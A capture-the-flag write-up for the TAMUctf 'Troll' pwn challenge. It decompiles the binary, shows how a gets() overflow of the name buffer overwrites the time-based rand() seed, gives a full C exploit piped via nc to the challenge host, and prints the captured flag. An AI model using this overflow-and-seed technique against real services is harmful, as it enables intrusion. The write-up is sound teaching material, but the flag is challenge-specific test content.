# Troll

## Description

> There's a troll who thinks his challenge won't be solved until the heat death of the universe.
> 
> nc challenges.tamuctf.com 4765

Binary of the server is given.

## Solution

Let's reverse the code using [Ghidra](https://ghidra-sre.org/).
```c
undefined8 main(void)
{
  int iVar1;
  char local_98 [64];
  char local_58 [44];
  int local_2c;
  FILE *local_28;
  int local_1c;
  time_t local_18;
  int local_c;
  
  setvbuf(stdout,(char *)0x2,0,0);
  local_18 = time((time_t *)0x0);
  puts("Who goes there?");
  gets(local_58);
  printf("Welcome to my challenge, %s. No one has ever succeeded before. Will you be thefirst?\n",
         local_58);
  srand((uint)local_18);
  local_c = 0;
  while( true ) {
    if (99 < local_c) {
      puts("You\'ve guessed all of my numbers. Here is your reward.");
      local_28 = fopen("flag.txt","r");
      if (local_28 != (FILE *)0x0) {
        fgets(local_98,0x40,local_28);
        puts(local_98);
      }
      puts("Goodbye.");
      return 0;
    }
    iVar1 = rand();
    local_1c = iVar1 % 100000 + 1;
    puts("I am thinking of a number from 1-100000. What is it?");
    __isoc99_scanf(&DAT_001020a5,&local_2c);
    if (local_1c != local_2c) break;
    puts("Impressive.");
    local_c = local_c + 1;
  }
  puts("You have failed. Goodbye.");
  return 0;
}
```

So, after asking for the user's name, the program asks the user to guess 100 numbers from 1 to 100 000, which are chosen randomly at runtime by the program. If the user succeeds, then he gets the flag.


How can we predict the numbers chosen by the program?

### Pseudo random generators

On computers, it is actually difficult to create real randomness, therefore pseudo randomness is used instead. The way pseudorandom generator work is to feed it with a seed, which is hopefully really random. 

Here the randomness comes from the starting time of the program: the line ```local_18 = time((time_t *)0x0);``` retrieves the local time of the machine, then the line ```srand((uint)local_18);``` feeds the content of the variable to the pseudorandom generator (which is then used with the ```rand``` function to create the random numbers).

So if we can synchronise with the server, then we can retrieve the local time, send our own version of the pseudorandom generator (with the same seed as we have synchronised), and it would yield the exact same numbers.

However, tests show that synchronising exactly with the server is tricky business, even if the precision of the time function is of the order of the second.

So another option is to directly tamper with the pseudo random generator by injecting a seed of our choosing.

### Buffer overflow

Hopefully, the program asks for the user's name between the moment it reads the server time and the moment it feeds the seed into the pseudo random generator. Moreover, it uses ```gets```, which is vulnerable to buffer overflow. Therefore we can overflow the name buffer to fill the seed variable with a chosen value (let's take 0 for instance). This will allow us to predict the chosen values.

Variables are declared (and placed on the stack) in this order:
```c
int iVar1;
char local_98 [64];
char local_58 [44];
int local_2c;
FILE *local_28;
int local_1c;
time_t local_18;
int local_c;
```

The name buffer is ```local_58```, and the seed variable is ```local_18```, so we want to fill 44 + 4 + 8 + 4 random characters, and then 8 null bytes. So we can directly inject 68 null characters.

### Full exploit

The exploit is therefore as follow:
- overflow the buffer to fill the seed variable. This is done by injecting 68 null bytes.
- initialise a local pseudo random generator with seed 0, and feed the same random numbers to the program.

This can be performed with the following c program:
```c
#include <stdio.h> 
#include <stdlib.h> 
  
int main () 
{ 
    int i;
      
    srand(0); 

    for(i = 0; i<68; i++)
        printf("%c", 0);
    printf("\n");
    
    for (i = 0; i < 100; i++)
    {
        printf("%d\n", rand() % 100000 + 1); 
    }
      
    return 0; 
}
```
Compile the program with
```
gcc srand_attack.c -o srand_attack
```
Then run the program and pipe its output to the remote server
```
./srand_attack | nc challenges.tamuctf.com 4765
```

Flag: gigem{Y0uve_g0ne_4nD_!D3fe4t3d_th3_tr01L!}